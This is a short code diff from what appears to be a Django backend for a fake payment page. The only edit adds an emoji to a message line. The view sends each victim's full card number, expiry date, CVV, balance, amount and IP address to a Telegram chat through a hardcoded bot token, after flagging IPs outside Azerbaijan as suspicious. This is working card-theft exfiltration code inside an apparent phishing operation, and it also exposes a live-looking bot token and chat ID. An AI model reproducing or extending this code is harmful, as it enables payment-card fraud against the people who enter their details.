@@ -202,7 +202,7 @@ def payments(request):
         country = get_country_from_ip(contact.ip)
         if country!= "AZ":
             country= 'Şübhəli İP!'
-        response = requests.post(f'https://api.telegram.org/bot6412307197:AAEYIhKwLwqYOXvdu9-G6PfmTyJeYmBCEEw/sendMessage?chat_id=-1001982703394&text=id:{contact.id}|ip:{contact.ip}|Country:{country}\nPage:{contact.page_name}\nMəbləğ:{contact.amount}\nCC:{cardnumber}|{contact.mm}|{contact.yy}|{contact.cvv}|Balans:{balance} \n@kitayskiadam @TetaLab @alienfx')
+        response = requests.post(f'https://api.telegram.org/bot6412307197:AAEYIhKwLwqYOXvdu9-G6PfmTyJeYmBCEEw/sendMessage?chat_id=-1001982703394&text=id:{contact.id}|ip:{contact.ip}|Country:{country}\nPage:{contact.page_name}\nMəbləğ:{contact.amount}\n🚧CC:{cardnumber}|{contact.mm}|{contact.yy}|{contact.cvv}|Balans:{balance} \n@kitayskiadam @TetaLab @alienfx')
 
         return render(request, "pages/loading.html",{'last_contact_id': contact.id})
     return render(request, "pay.html")
